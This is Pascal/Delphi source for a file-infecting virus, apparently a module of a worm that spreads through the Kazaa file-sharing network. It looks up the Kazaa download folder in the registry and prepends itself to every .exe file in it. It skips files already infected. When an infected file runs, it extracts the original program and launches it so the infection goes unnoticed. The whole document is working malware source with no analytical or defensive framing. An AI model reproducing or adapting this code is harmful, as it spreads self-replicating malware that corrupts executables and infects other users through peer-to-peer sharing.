   UNIT prep;

   INTERFACE

   PROCEDURE DropFile;
   PROCEDURE InfectKazaaDir;
   FUNCTION KazaaDir : STRING;

   IMPLEMENTATION

   USES
     ACLUtils, Windows, Registry;

   CONST
     L = 'M*/OOPUU';

   FUNCTION KazaaDir : STRING;
   VAR
     Reg : TRegistry;
   BEGIN
     Result:='';
     Reg:=Tregistry.Create;
     Reg.RootKey:=HKEY_CURRENT_USER;
     IF Reg.OpenKey('\Software\Kazaa\LocalContent',False) THEN BEGIN
      Result:=Reg.ReadString('DownloadDir')+'\';
     END;
     Reg.CloseKey;
   END;

   FUNCTION TempPath : STRING;
   VAR
     I : WORD;
     S : ARRAY [1..MAX_PATH] OF Char;
   BEGIN
     ZeroMemory(@S[1],MAX_PATH);
     GetTempPath(MAX_PATH, @S);
     I:=0;
     REPEAT
       Inc(I);
       Result:=Result+S[I];
     UNTIL S[I+1]=chr(0);
   END;

   FUNCTION CheckInfection(Virus,DestinationFile:STRING) : BOOL;
   VAR
     F,G       : FILE;
     BufA,BufB : ARRAY [1..5000] OF Char;
   BEGIN
     Result:=False;
     FileMode:=0;
     AssignFile(F,Virus);
     AssignFile(G,DestinationFile);
     {$I-}
     Reset(F,1);
     IF IOResult=0 THEN BEGIN
       Reset(G,1);
       IF IOResult=0 THEN BEGIN
         BlockRead(F,BufA[1],5000);
         BlockRead(G,BufB[1],5000);
         IF BufA=BufB THEN Result:=True;
         CloseFile(F);
         CloseFile(G);
       END;
     END;
     {$I+}
   END;

   PROCEDURE Prepend(Virus,DestinationFile:STRING);
   VAR
     F,G : FILE;
     T   : STRING;
     H   : STRING;
     I   : Longint;
     Buf : AnsiString;
   BEGIN
     IF NOT CheckInfection(Virus,DestinationFile) THEN BEGIN
       {$I-}
       T:=LowerCase(L);
       H:=TempPath+'010101.dat';
       CopyFile(pChar(DestinationFile),pChar(H),False);
       CopyFile(pChar(Virus),pChar(DestinatioNFile),False);
       FileMode:=2;
       AssignFile(F,DestinationFile);
       AssignFile(G,H);
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         Reset(G,1);
         IF IOResult=0 THEN BEGIN
           Seek(F,FileSize(F));
           BlockWrite(F,T[1],Length(T));
           I:=FileSize(G);
           SetLength(Buf,I);
           BlockRead(G,Buf[1],I);
           BlockWrite(F,Buf[1],I);
           CloseFile(G);
           CloseFile(F);
         END;
       END;
     END;
     {$I+}
     DeleteFile(pChar(H));
   END;

   PROCEDURE CutFile(F:STRING);
   VAR
     G : FILE;
     A : Longint;
     P : AnsiString;
   BEGIN
     FileMode:=2;
     AssignFile(G,F);
     {$I-}
     Reset(G,1);
     IF IOResult=0 THEN BEGIN
       A:=FileSize(G);
       SetLength(P,A);
       BlockRead(G,P[1],A);
       A:=Pos(LowerCase(L),P);
       IF A>0 THEN BEGIN
         Seek(G,A-1);
         Truncate(G);
       END;
       CloseFile(G);
     END;
     {$I+}
   END;

   PROCEDURE DropFile;
   VAR
     G   : FILE;
     S   : STRING;
     T   : Longint;
     Buf : AnsiString;
   BEGIN
     FileMode:=0;
     AssignFile(G,ParamStr(0));
     {$I-}
     Reset(G,1);
     IF IOResult=0 THEN BEGIN
       SetLength(Buf,FileSize(G));
       BlockRead(G,Buf[1],FileSize(G));
       T:=Pos(LowerCase(L),Buf);   //**
       CloseFile(G);
       IF T>0 THEN BEGIN
         T:=T+Length(L)-1;
         S:=TempPath+ExtractFileName(ParamStr(0));
         CopyFile(pChar(ParamStr(0)),pChar(S),False);
         FileMode:=2;
         AssignFile(G,S);
         Reset(G,1);
         IF IOResult=0 THEN BEGIN
           Seek(G,T);
           T:=FileSize(G)-T;
           SetLength(Buf,T);
           BlockRead(G,Buf[1],T);
           Seek(G,0);
           BlockWrite(G,Buf[1],T);
           Truncate(G);
           CloseFile(G);
           WinExec(pChar(S),SW_SHOW);
         END;
       END;
     END;
     {$I+}
   END;

   PROCEDURE InfectKazaaDir;
   VAR
     D     : TSearchRec;
     Error : Integer;
     N     : STRING;
   BEGIN
     Error:=FindFirst(KazaaDir+'*.exe',faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       N:=KazaaDir+D.Name;
       Prepend(ParamStr(0),N);
       Error:=FindNext(D);
     END;
   END;

   END.
